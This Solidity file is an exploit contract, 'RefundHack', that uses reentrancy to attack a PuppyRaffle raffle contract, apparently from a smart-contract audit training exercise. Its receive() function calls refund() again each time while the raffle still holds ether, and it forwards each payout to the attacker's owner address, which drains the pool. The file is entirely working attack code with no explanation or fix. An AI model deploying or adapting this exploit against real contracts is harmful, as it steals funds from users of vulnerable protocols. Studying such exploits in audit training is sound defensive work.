// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {console} from "forge-std/Test.sol";

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;
    function refund(uint256 playerIndex) external;
    function getActivePlayerIndex(address player) external view returns (uint256);
}

contract RefundHack {
    IPuppyRaffle puppyRaffle;

    address owner;
    uint256 indexOfPlayer;
    uint256 entranceFee = 1e18;

    modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }

    constructor(address _puppyRaffle) {
        owner = msg.sender;
        puppyRaffle = IPuppyRaffle(_puppyRaffle);
    }

    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function attack() external onlyOwner {
        indexOfPlayer = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfPlayer);
    }

    receive() external payable {
        uint256 raffleBalance = (address(puppyRaffle).balance / 1e18);
        if (raffleBalance > 0) {
            puppyRaffle.refund(indexOfPlayer);
        }
        (bool success,) = owner.call{value: msg.value}("");
        require(success);
    }
}
